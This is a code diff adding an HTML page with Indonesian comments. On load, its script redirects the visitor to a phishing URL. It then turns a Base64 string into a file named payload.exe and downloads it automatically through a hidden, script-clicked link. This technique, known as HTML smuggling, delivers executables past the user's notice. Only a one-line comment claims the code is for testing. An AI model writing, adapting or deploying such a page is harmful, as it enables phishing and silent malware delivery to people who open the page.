@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Open URL</title> <!-- Judul halaman -->
+</head>
+<body>
+  <script>
+    // Mengalihkan pengguna ke URL phishing
+    window.location.href = "https://www.phishing.com/"; 
+    // Catatan: URL ini seharusnya hanya digunakan untuk pengujian, bukan untuk tujuan ilegal.
+
+    // Fungsi untuk mengonversi string Base64 ke ArrayBuffer
+    function base64ToArrayBuffer(base64) {
+      var binary_string = window.atob(base64); // Mendekode string Base64 ke string biner
+      var len = binary_string.length; // Mendapatkan panjang string biner
+      var bytes = new Uint8Array(len); // Membuat array byte dengan panjang yang sesuai
+      for (var i = 0; i < len; i++) {
+        bytes[i] = binary_string.charCodeAt(i); // Mengonversi karakter biner ke kode ASCII
+      }
+      return bytes.buffer; // Mengembalikan buffer byte untuk digunakan lebih lanjut
+    }
+
+    // String Base64 yang merepresentasikan file
+    var file = 'Your base64 string here'; // Masukkan string Base64 file Anda di sini
+
+    // Mengonversi string Base64 menjadi data ArrayBuffer
+    var data = base64ToArrayBuffer(file);
+
+    // Membuat objek Blob dari data yang dikonversi
+    var blob = new Blob([data], { type: 'octet/stream' }); // 'octet/stream' digunakan untuk file biner
+
+    // Menentukan nama file yang akan diunduh
+    var fileName = 'payload.exe'; // Nama file unduhan
+
+    // Membuat elemen anchor (<a>) secara dinamis
+    var a = document.createElement('a'); // Membuat elemen <a> baru
+    document.body.appendChild(a); // Menambahkan elemen <a> ke dalam dokumen
+    a.style = 'display: none;'; // Menyembunyikan elemen <a> agar tidak terlihat oleh pengguna
+    var url = window.URL.createObjectURL(blob); // Membuat URL sementara untuk Blob
+    a.href = url; // Mengatur href anchor ke URL Blob
+    a.download = fileName; // Mengatur nama file untuk unduhan
+    a.click(); // Memicu klik otomatis untuk memulai unduhan
+    window.URL.revokeObjectURL(url); // Membebaskan memori dengan mencabut URL Blob
+  </script>
+</body>
+</html>
